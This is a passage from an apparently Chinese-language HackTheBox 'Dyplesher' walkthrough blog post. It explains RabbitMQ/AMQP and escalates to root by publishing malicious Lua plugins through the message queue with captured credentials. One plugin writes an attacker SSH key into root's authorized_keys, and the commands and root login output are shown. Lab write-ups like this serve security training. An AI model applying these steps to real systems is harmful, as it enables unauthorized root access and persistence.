class="line">uid&#x3D;1000(felamos) gid&#x3D;1000(felamos) groups&#x3D;1000(felamos)</span><br></pre></td></tr></table></figure>

<p>在home目录下发现user.txt，拿到user flag：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">felamos@dyplesher:~$ ls</span><br><span class="line">cache  snap  user.txt  yuntao</span><br><span class="line">felamos@dyplesher:~$ cat user.txt </span><br><span class="line">xxxxxxxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>在<code>/home/felamos</code>下存在名为<code>yuntao</code>的目录，目录下只有一个脚本<code>send.sh</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">felamos@dyplesher:~$ cd yuntao&#x2F;</span><br><span class="line">felamos@dyplesher:~&#x2F;yuntao$ ls</span><br><span class="line">send.sh</span><br><span class="line">felamos@dyplesher:~&#x2F;yuntao$ cat send.sh</span><br><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">echo &#39;Hey yuntao, Please publish all cuberite plugins created by players on plugin_data &quot;Exchange&quot; and &quot;Queue&quot;. Just send url to download plugins and our new code will review it and working plugins will be added to the server.&#39; &gt;  &#x2F;dev&#x2F;pts&#x2F;&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>这个脚本没有什么特别的意思，只是会向<code>/dev/pts/</code>目录下的<code>{}</code>管道输出一条消息：</p>
<blockquote>
<p>Yuntao， 请发布所有用户的cuberite插件，只需要提供url去下载plugin即可，我们的代码会自动访问该插件并且将插件放在服务器上执行。</p>
</blockquote>
<h4 id="AMQP协议"><a href="#AMQP协议" class="headerlink" title="AMQP协议"></a>AMQP协议</h4><p>AMQP协议全称Advanced Message Queuing Protocol（高级消息队列协议），是面向消息中间件提供的开放的应用层协议，其设计目标是对消息的排序、路由、保证可靠性和安全性（<a href="https://zh.wikipedia.org/zh-hans/%E9%AB%98%E7%BA%A7%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener">wikipedia</a>）。我们可以把消息队列比作是一个存放消息的容器，当我们需要使用消息的时候可以取出消息供自己使用，目的是通过异步处理提高系统性能、降低系统耦合性，目前使用比较多的消息队列有ActiveMQ，RabbitMQ（<a href="https://zhuanlan.zhihu.com/p/52773169" target="_blank" rel="noopener">zhihu</a>），后者就是目标服务器上使用的消息队列。</p>
<h4 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h4><p>RabbitMQ是一个实现了AMQP协议的消息队列。RabbitMQ的工作原理如下图所示：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/38.png" alt="38"></p>
<ul>
<li>Producer：发送消息到MQ。</li>
<li>Broker：消息队列服务进程，包括exchange和queue。</li>
<li>Exchange：消息队列交换机，会按照一定的规则对消息进行过滤，并将消息转发到某个队列。</li>
<li>Queue：消息队列，在消息到达队列的时候会被转发给指定的Consumer。</li>
<li>Consumer：接收MQ转发的消息。</li>
</ul>
<p>当存在多个Queue的时候，消息会被Exchange按照一定的路由规则分发到指定的Queue中去。这就涉及到Producer指定的消息的routing key，routing key指定了Message会被发送到哪个Exchange，Queue会通过binding key绑定到指定的Exchange。Exchange通过对比Message的routing key和Queue的binding key来决定消息会被发送到哪个队列。</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/39.png" alt="39"></p>
<p>前面提到的<code>send.sh</code>就是指Yuntao可以发布用户自己定制的cuberite插件，如下图所示：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/40.png" alt="40"></p>
<p>Cubrite是一个可扩展的Minecraft服务器实现，它有一个易于使用的插件系统，允许用户用Lua编写自定义插件。</p>
<p>从之前抓到的流量包里我们也知道了Yuntao的AMQP凭证是<code>EashAnicOc3Op</code>：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/41.png" alt="41"></p>
<p>我们可以借用一款工具来发布我们的Lua插件，<a href="https://github.com/selency/amqp-publish" target="_blank" rel="noopener">amqp-publish</a>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~&#x2F;htb-tools </span><br><span class="line">╰─# .&#x2F;amqp-publish.linux-amd64 --help        </span><br><span class="line">Usage of .&#x2F;amqp-publish.linux-amd64:</span><br><span class="line">  -body string</span><br><span class="line">        Message body</span><br><span class="line">  -exchange string</span><br><span class="line">        Exchange name</span><br><span class="line">  -routing-key string</span><br><span class="line">        Routing key. Use queue</span><br><span class="line">        name with blank exchange to publish directly to queue.</span><br><span class="line">  -uri string</span><br><span class="line">        AMQP URI amqp:&#x2F;&#x2F;&lt;user&gt;:&lt;password&gt;@&lt;host&gt;:&lt;port&gt;&#x2F;[vhost]</span><br></pre></td></tr></table></figure>

<p>在此之前，先看看是否可以通过这种方式在目标服务器上执行命令。先尝试创建一个lua脚本，它会向/tmp目录写入名为test的文件：</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// test.lua</span><br><span class="line"></span><br><span class="line"><span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">"touch /tmp/test"</span>)</span><br></pre></td></tr></table></figure>

<p>先在目标主机上开启fpt服务，主要目的是判断我们有没有成功发布消息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MinatoTW@dyplesher:~&#x2F;paper$ python3 -m http.server 22222</span><br><span class="line">Serving HTTP on 0.0.0.0 port 22222 (http:&#x2F;&#x2F;0.0.0.0:22222&#x2F;) ...</span><br></pre></td></tr></table></figure>

<p>除了已经知道的<code>&lt;user&gt;:&lt;password&gt;</code>以外，我们还需要提供<code>exchange</code>和<code>routing-key</code>，从<code>send.sh</code>中可以推测出它们应该是<code>plugin_data</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hey yuntao, Please publish all cuberite plugins created by players on plugin_data &quot;Exchange&quot; and &quot;Queue&quot;.</span><br></pre></td></tr></table></figure>

<p>通过amqp-publish发布：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~&#x2F;htb-tools </span><br><span class="line">╰─# .&#x2F;amqp-publish.linux-amd64 --uri&#x3D;&quot;amqp:&#x2F;&#x2F;yuntao:EashAnicOc3Op@10.10.10.190:5672&#x2F;&quot; --exchange&#x3D;&quot;&quot; --routing-key&#x3D;&quot;plugin_data&quot; --body&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:22222&#x2F;test.lua&quot;</span><br></pre></td></tr></table></figure>

<p>消息被成功发布：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MinatoTW@dyplesher:~&#x2F;paper$ python3 -m http.server 22222</span><br><span class="line">Serving HTTP on 0.0.0.0 port 22222 (http:&#x2F;&#x2F;0.0.0.0:22222&#x2F;) ...</span><br><span class="line">127.0.0.1 - - [07&#x2F;Nov&#x2F;2020 18:38:50] &quot;GET &#x2F;test.lua HTTP&#x2F;1.0&quot; 200 -</span><br></pre></td></tr></table></figure>

<p><code>test.lua</code>被成功执行，在<code>/tmp</code>目录下，<code>test</code>文件被创建：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/42.png" alt="42"></p>
<p>并且该文件是属于root用户的。</p>
<h4 id="ssh-lua-gt-RCE"><a href="#ssh-lua-gt-RCE" class="headerlink" title="ssh.lua -&gt; RCE"></a>ssh.lua -&gt; RCE</h4><p>现在我们可以向<code>/root/.ssh/authorized_keys</code>写入我们的公钥：</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// ssh.lua</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">io</span>.<span class="built_in">open</span>(<span class="string">'/root/.ssh/authorized_keys'</span>, <span class="string">'w+'</span>)</span><br><span class="line">ssh = <span class="string">'ssh-rsa AAAAB......BL/upYw== kali@kali'</span></span><br><span class="line">file.<span class="built_in">write</span>(ssh)</span><br><span class="line">file.<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure>

<p>通过同样的方式发布：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~&#x2F;htb-tools </span><br><span class="line">╰─# .&#x2F;amqp-publish.linux-amd64 --uri&#x3D;&quot;amqp:&#x2F;&#x2F;yuntao:EashAnicOc3Op@10.10.10.190:5672&#x2F;&quot; --exchange&#x3D;&quot;&quot; --routing-key&#x3D;&quot;plugin_data&quot; --body&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:22222&#x2F;ssh.lua&quot;</span><br></pre></td></tr></table></figure>

<p>成功登录root用户：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~&#x2F;.ssh </span><br><span class="line">╰─# ls</span><br><span class="line">id_rsa  id_rsa.pub  known_hosts</span><br><span class="line">╭─kali@kali ~&#x2F;.ssh </span><br><span class="line">╰─# ssh -i id_rsa root@10.10.10.190</span><br><span class="line">Welcome to Ubuntu 19.10 (GNU&#x2F;Linux 5.3.0-46-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https:&#x2F;&#x2F;help.ubuntu.com</span><br><span class="line"> * Management:     https:&#x2F;&#x2F;landscape.canonical.com</span><br><span class="line"> * Support:        https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage</span><br><span class="line"></span><br><span class="line">  System information as of Sat 07 Nov 2020 06:44:33 PM UTC</span><br><span class="line"></span><br><span class="line">  System load:  0.06              Processes:              261</span><br><span class="line">  Usage of &#x2F;:   6.7% of 97.93GB   Users logged in:        1</span><br><span class="line">  Memory usage: 42%               IP address for ens33:   10.10.10.190</span><br><span class="line">  Swap usage:   0%                IP address for docker0: 172.17.0.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">57 updates can be installed immediately.</span><br><span class="line">0 of these updates are security updates.</span><br><span class="line">To see these additional updates run: apt list --upgradable</span><br><span class="line"></span><br><span class="line">Failed to connect to https:&#x2F;&#x2F;changelogs.ubuntu.com&#x2F;meta-release. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Sun May 24 03:33:34 2020</span><br><span class="line">root@dyplesher:~# id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">root@dyplesher:~#</span><br></pre></td></tr></table></figure>

<p>读取root.txt：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@dyplesher:~# ls</span><br><span class="line">root.txt  snap  work</span><br></pre></td></tr></table></figure>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Bantian</span>
                    </p>
                
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>早睡早起身体好</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/HackTheBox/"># HackTheBox</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2021/08/01/MalwareTrafficAnalysis1/">流量分析系列之Malware-Traffic-上</a>
            
            
            <a class="next" rel="next" href="/2021/04/26/Joern%E8%A7%A3%E6%9E%90%E9%97%AE%E9%A2%98%E4%B9%8B%E6%9D%A1%E4%BB%B6%E5%8F%A5%E7%89%B9%E6%AE%8A%E7%BB%93%E6%9E%84/">Joern解析问题之条件句特殊结构</a>
            
        </section>


    </article>
</div>

        </div>
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>
</html>
